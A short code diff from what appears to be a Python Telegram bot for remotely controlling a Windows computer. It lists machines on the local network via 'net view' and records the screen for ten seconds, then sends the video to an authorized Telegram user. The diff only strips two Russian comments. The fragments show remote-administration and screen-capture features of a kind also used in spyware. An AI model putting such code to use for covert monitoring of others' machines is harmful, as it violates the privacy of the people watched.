@@ -177,7 +177,7 @@ def is_authorized(user_id):
 def list_network_computers():
     try:
         result = subprocess.check_output("net view", shell=True, stderr=subprocess.STDOUT, universal_newlines=False)
-        result = result.decode('windows-1251')  # Пытаемся декодировать в windows-1251
+        result = result.decode('windows-1251') 
         computers = [line.strip() for line in result.splitlines() if line.strip() and not line.startswith("Список компьютеров")]
         if computers:
             return "\n".join(computers)
@@ -417,7 +417,7 @@ async def handle_show_video(message: types.Message):
         await message.reply("❌ У вас нет доступа к этой команде.")
         return
     
-    video_path = record_screen(duration=10)  # Записываем видео продолжительностью 10 секунд
+    video_path = record_screen(duration=10) 
 
     try:
         with open(video_path, 'rb') as video_file:
